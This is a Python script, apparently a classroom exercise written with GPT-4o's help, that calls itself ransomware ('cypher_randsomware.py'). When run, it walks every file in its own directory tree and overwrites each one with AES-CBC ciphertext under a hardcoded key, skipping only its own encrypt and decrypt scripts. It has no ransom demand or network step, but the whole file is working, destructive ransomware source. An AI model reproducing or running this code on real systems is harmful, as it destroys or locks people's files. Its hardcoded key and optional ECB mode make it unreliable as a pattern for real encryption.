"""
Realizado por: Diego Morales Aquino
Con ayuda del modelo GPT-4o https://chatgpt.com/share/67dcc3c6-906c-8006-a9a9-66867877d793
"""
import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad

def get_directory_content(path, ignore_files_in_root=[]):
    """
    Obtiene el contenido de un directorio de forma recursiva.
    Retorna (tipo, nombre, contenido) donde tipo es "directory" o "file". 
    Si es un directorio, el contenido es una lista de elementos con la misma estructura.
    """
    # Verificar si la ruta es un directorio
    if os.path.isdir(path):
        directory = ("directory", os.path.basename(path), [])
        
        # Recorrer los elementos dentro del directorio
        for item in os.listdir(path):
            item_path = os.path.join(path, item)
            if os.path.isdir(item_path):
                # Si es un directorio, llamar recursivamente
                directory[2].append(get_directory_content(item_path))
            else:
                # Si es un archivo, agregar
                if item not in ignore_files_in_root:
                    directory[2].append(("file", item, None))
        
        return directory
    else:
        raise ValueError(f"La ruta {path} no es un directorio.")

def aes_encrypt(plaintext: bytes, key: bytes, mode: str):
    if mode.lower() == 'cbc':
        iv = get_random_bytes(16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
        return iv + ciphertext  # Guardamos IV junto al ciphertext
    elif mode.lower() == 'ecb':
        cipher = AES.new(key, AES.MODE_ECB)
        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
        return ciphertext
    else:
        raise ValueError("Modo no soportado. Usa 'cbc' o 'ecb'.")

def cypher_recursive(directory, directory_content, key, mode="cbc"):

    for item in directory_content:
        if item[0] == "directory":
            cypher_recursive(os.path.join(directory, item[1]), item[2], key, mode)

        else:
            file_path = os.path.join(directory, item[1])
            with open(file_path, "rb") as file:
                plaintext = file.read()
                ciphertext = aes_encrypt(plaintext, key, mode)
                
                with open(file_path, "wb") as file:
                    file.write(ciphertext)

path = os.path.dirname(os.path.abspath(__file__)) # Directorio donde está el script
directory_content = get_directory_content(path, ignore_files_in_root=["cypher_randsomware.py", "decypher_randsomware.py"])[2]
key = b'1234567890qwerty' # llave
cypher_recursive(directory=path, directory_content=directory_content, key=key, mode="cbc")
print("Cifrado completado")